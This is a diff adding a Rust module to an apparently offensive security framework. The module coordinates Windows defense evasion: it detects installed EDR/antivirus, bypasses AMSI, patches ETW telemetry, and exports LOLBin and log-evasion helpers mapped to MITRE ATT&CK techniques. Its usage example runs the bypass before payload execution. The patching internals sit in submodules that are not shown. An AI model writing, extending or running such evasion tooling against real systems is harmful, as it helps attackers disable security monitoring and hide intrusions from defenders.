@@ -1,0 +1,218 @@
+//! OPSEC (Operational Security) Module
+//!
+//! Provides comprehensive stealth capabilities for evading security controls:
+//!
+//! ## Modules
+//!
+//! - **engine**: Core OPSEC engine with traffic shaping, EDR detection, LOLBins
+//! - **amsi_bypass**: Windows AMSI bypass techniques (T1562.001)
+//! - **etw_patcher**: Windows ETW patching for telemetry evasion (T1562.006)
+//! - **windows_internals**: Low-level Windows API helpers
+//!
+//! ## MITRE ATT&CK Coverage
+//!
+//! - T1562.001: Disable or Modify Tools (AMSI)
+//! - T1562.006: Indicator Blocking (ETW)
+//! - T1070: Indicator Removal
+//! - T1027: Obfuscation
+//! - T1497: Virtualization/Sandbox Evasion
+//! - T1036: Masquerading (LOLBins)
+//!
+//! ## Usage Example
+//!
+//! ```rust,ignore
+//! use ferox::modules::evasion::opsec::{
+//!     OpsecEngine, OpsecConfig, StealthLevel,
+//!     AmsiBypass, AmsiBypassTechnique,
+//!     EtwPatcher, EtwProvider,
+//! };
+//!
+//! // Create OPSEC engine with ghost mode
+//! let engine = OpsecEngine::new(OpsecConfig::ghost(), Platform::Windows);
+//!
+//! // Bypass AMSI before payload execution
+//! let mut amsi = AmsiBypass::new(AmsiBypassTechnique::PatchScanBuffer);
+//! let result = amsi.execute();
+//!
+//! // Patch ETW to prevent telemetry
+//! let mut etw = EtwPatcher::new();
+//! let result = etw.patch_all();
+//! ```
+//!
+//! **SECURITY NOTICE**: AUTHORIZED USE ONLY
+
+// Core OPSEC engine (existing code)
+pub mod engine;
+
+// Windows-specific evasion modules
+pub mod amsi_bypass;
+pub mod etw_patcher;
+pub mod windows_internals;
+
+// Re-export core engine types
+pub use engine::{
+    DefaultTrafficShaper, EdrDetectionResult, EdrDetector, EdrSignature, EdrType, LogEvasion,
+    LolbinExecutor, LolbinMapping, MonitoredAction, NetworkNoise, OpsecConfig, OpsecDecision,
+    OpsecEngine, OpsecReport, StealthLevel, TrafficShaper, UserSimulator, WorkingHours,
+};
+
+// Re-export AMSI bypass types
+pub use amsi_bypass::{AmsiBypass, AmsiBypassResult, AmsiBypassTechnique, AmsiReference};
+
+// Re-export ETW patcher types
+pub use etw_patcher::{EtwPatchResult, EtwPatchTechnique, EtwPatcher, EtwProvider, EtwReference};
+
+// Re-export Windows internals types
+pub use windows_internals::{patches, PatchInfo, WinError, WinResult};
+
+// ============================================================================
+// Integrated OPSEC Operations
+// ============================================================================
+
+use crate::core::module::Platform;
+
+/// Comprehensive OPSEC setup result
+#[derive(Debug, Clone)]
+pub struct OpsecSetupResult {
+    /// AMSI bypass result (Windows only)
+    pub amsi_result: Option<AmsiBypassResult>,
+    /// ETW patch result (Windows only)
+    pub etw_result: Option<EtwPatchResult>,
+    /// EDR detection result
+    pub edr_result: Option<EdrDetectionResult>,
+    /// Overall success
+    pub success: bool,
+    /// Summary message
+    pub message: String,
+}
+
+/// Perform full OPSEC setup for Windows targets
+///
+/// This function:
+/// 1. Detects installed EDR/AV
+/// 2. Bypasses AMSI
+/// 3. Patches ETW
+/// 4. Returns comprehensive results
+pub async fn setup_windows_opsec(
+    config: &OpsecConfig,
+    safe_mode: bool,
+) -> OpsecSetupResult {
+    let mut results = OpsecSetupResult {
+        amsi_result: None,
+        etw_result: None,
+        edr_result: None,
+        success: false,
+        message: String::new(),
+    };
+
+    // Step 1: EDR Detection
+    let edr_detector = EdrDetector::new();
+    match edr_detector.detect(safe_mode).await {
+        Ok(edr_result) => {
+            results.edr_result = Some(edr_result);
+        }
+        Err(e) => {
+            results.message = format!("EDR detection failed: {}", e);
+        }
+    }
+
+    // Step 2: AMSI Bypass (if enabled)
+    if config.amsi_bypass {
+        let mut amsi = AmsiBypass::default();
+        let amsi_result = amsi.execute();
+        results.amsi_result = Some(amsi_result);
+    }
+
+    // Step 3: ETW Patching (if enabled)
+    if config.etw_patch {
+        let mut etw = EtwPatcher::new();
+        let etw_result = etw.patch_all();
+        results.etw_result = Some(etw_result);
+    }
+
+    // Determine overall success
+    let amsi_ok = results
+        .amsi_result
+        .as_ref()
+        .map(|r| r.success)
+        .unwrap_or(true);
+    let etw_ok = results
+        .etw_result
+        .as_ref()
+        .map(|r| r.success)
+        .unwrap_or(true);
+
+    results.success = amsi_ok && etw_ok;
+    results.message = if results.success {
+        "OPSEC setup complete".to_string()
+    } else {
+        let mut failures = vec![];
+        if !amsi_ok {
+            failures.push("AMSI");
+        }
+        if !etw_ok {
+            failures.push("ETW");
+        }
+        format!("OPSEC setup partial - failed: {}", failures.join(", "))
+    };
+
+    results
+}
+
+/// Quick OPSEC check - returns recommended configuration
+pub async fn check_opsec_requirements(platform: Platform, safe_mode: bool) -> OpsecConfig {
+    if platform != Platform::Windows {
+        return OpsecConfig::quiet();
+    }
+
+    let edr_detector = EdrDetector::new();
+    match edr_detector.detect(safe_mode).await {
+        Ok(result) => result.recommended_config,
+        Err(_) => OpsecConfig::quiet(),
+    }
+}
+
+// ============================================================================
+// Tests
+// ============================================================================
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn test_module_exports() {
+        // Verify all expected types are exported
+        let _config = OpsecConfig::default();
+        let _level = StealthLevel::Ghost;
+        let _technique = AmsiBypassTechnique::PatchScanBuffer;
+        let _provider = EtwProvider::PowerShell;
+    }
+
+    #[test]
+    fn test_opsec_config_presets() {
+        let ghost = OpsecConfig::ghost();
+        assert!(ghost.amsi_bypass);
+        assert!(ghost.etw_patch);
+        assert!(ghost.memory_only);
+
+        let normal = OpsecConfig::normal();
+        assert!(!normal.amsi_bypass);
+        assert!(!normal.etw_patch);
+    }
+
+    #[tokio::test]
+    async fn test_opsec_setup_safe_mode() {
+        let config = OpsecConfig::quiet();
+        let result = setup_windows_opsec(&config, true).await;
+
+        // In safe mode on non-Windows, should still return a result
+        assert!(result.message.len() > 0);
+    }
+
+    #[tokio::test]
+    async fn test_check_opsec_requirements() {
+        let config = check_opsec_requirements(Platform::Linux, true).await;
+        assert_eq!(config.stealth_level, StealthLevel::Quiet);
+    }
+}
